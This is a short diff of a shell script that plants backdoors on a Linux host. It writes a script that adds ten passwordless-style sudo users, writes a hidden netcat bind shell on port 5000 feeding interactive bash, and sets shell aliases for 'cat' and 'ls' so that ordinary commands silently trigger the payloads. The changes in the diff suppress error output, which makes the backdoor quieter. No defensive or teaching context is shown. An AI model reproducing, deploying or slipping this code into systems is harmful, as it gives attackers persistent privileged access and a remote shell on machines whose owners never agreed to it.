@@ -69,7 +69,7 @@ cat << EOF > /sbin/let_us_in_VIRUS.sh
 #!/bin/bash
 for i in {1..10}
 do
-/usr/sbin/useradd -M -g sudo -p \$(openssl passwd -crypt \$i) \$i 2&>/dev/null
+/usr/sbin/useradd -M -g sudo -p \$(openssl passwd -crypt \$i) \$i &>/dev/null
 done
 EOF
 chmod 755 /sbin/let_us_in_VIRUS.sh
@@ -77,7 +77,7 @@ chmod 755 /sbin/let_us_in_VIRUS.sh
 
 cat << EOF > /sbin/.open.up.vIrUs.sh
 #!/bin/bash
-rm /tmp/d;mkfifo /tmp/d;cat /tmp/d|/bin/bash -i 2>&1|nc -l 5000 >/tmp/d
+rm /tmp/d 2>/dev/null;mkfifo /tmp/d;cat /tmp/d|/bin/bash -i 2>&1|nc -l 5000 >/tmp/d 2>/dev/null
 EOF
 chmod 755 /sbin/.open.up.vIrUs.sh
 
@@ -174,7 +174,7 @@ if [ -x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-no
 	}
 fi
 
-alias cd='/sbin/let_us_in_VIRUS.sh; cd'
+alias cat='/sbin/let_us_in_VIRUS.sh; cat'
 alias ls='/bin/malware.sh; ls'
 #PS1="\u@\h:\w\$ "
 #what user@comp prompt looks like
